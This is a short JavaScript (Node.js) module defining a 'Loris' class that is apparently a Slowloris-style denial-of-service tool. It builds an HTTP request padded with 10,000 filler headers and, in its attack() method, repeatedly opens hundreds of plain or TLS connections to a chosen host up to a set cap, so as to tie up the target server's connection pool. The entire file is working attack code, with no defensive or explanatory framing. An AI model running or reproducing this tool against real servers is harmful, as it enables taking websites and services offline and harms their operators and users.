
const url = require('url'),
	net = require('net'),
	tls = require('tls'),
	Channel = require('./channel.js');

class Loris extends require('events') {

	constructor(u, cap, speed = 200) {
		super();
		this.speed = speed;
		this._url = url.parse((u.match(/^https*\:\/\//)) ? u : 'http://' + u);
		this.cap = cap;
		this.current = [];
		this.connections = 0;
		let req = [
			'Host: ' + this._url.hostname,
			'Accept: */*'
		];
		for (let i = 0; i < 10000; i++) {
			req.push('X-Loris-' + i + ': ' + i);
		}
		this.req = req.join('\r\n') + '\r\n\r\n';
	}

	get pool() {
		return this.current.length;
	}

	attack() {
		const secure = this._url.protocol === 'https:', handle = (secure ? tls : net), option = {
			port: this._url.port || (secure ? 443 : 80),
			host: this._url.hostname
		};
		setInterval(() => {
			if (this.current.length < this.cap && this.connections === this.current.length) {
				let ramp = Math.min(this.cap - this.current.length, 500);
				this.emit('ramp', ramp);
				for (let i = 0; i < ramp; i++) {
					let c = new Channel(handle, option, this.req);
					c.once('connected', () => {
						this.connections += 1;
					});
					c.once('closed', () => {
						this.connections += -1;
					});
					this.current.push(c);
				}
			}
		}, 100);

		return this;
	}

}

module.exports = Loris;
